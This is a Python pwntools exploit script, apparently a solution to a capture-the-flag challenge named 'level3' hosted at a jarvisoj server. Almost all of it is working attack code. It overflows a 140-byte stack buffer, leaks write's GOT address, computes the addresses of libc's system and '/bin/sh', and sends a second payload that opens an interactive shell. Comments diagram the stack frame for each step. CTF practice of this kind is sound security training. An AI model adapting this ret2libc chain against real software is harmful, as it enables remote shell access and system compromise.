# -*- coding: utf-8 -*-
from pwn import *

conn = remote('pwn2.jarvisoj.com', 9879)
#conn = remote('127.0.0.1', 12001)
b = ELF('level3')
l = ELF('libc-2.19.so')

conn.recvline()
payload1 = 140 * 'A' + p32(b.plt['write']) + p32(b.symbols['vulnerable_function']) + p32(1) + p32(b.got['write']) + p32(4)
conn.sendline(payload1)
addr = u32(conn.recv(4))
print(addr)

sys_addr = l.symbols['system'] - l.symbols['write'] + addr
bin_sh_addr = l.search('/bin/sh').next() - l.symbols['write'] + addr

payload2 = 140 * 'A' + p32(sys_addr) + 4 * 'a' + p32(bin_sh_addr)
conn.sendline(payload2)
conn.interactive()

##step 1
##
##H
##4
##got
##1
##ret_ret (4 Byte) < vulnerable_function "use for second payload"
##ret (4 Byte) <  write_plt "use for init lib"
##rbp (4 Byte)
##136 Byte
##
##
##L


##step 2
##
##H
##system_arg (4 Byte)
##system_ret (4 Byte)
##rbp (4 Byte)
##136 Byte
##
##
##L

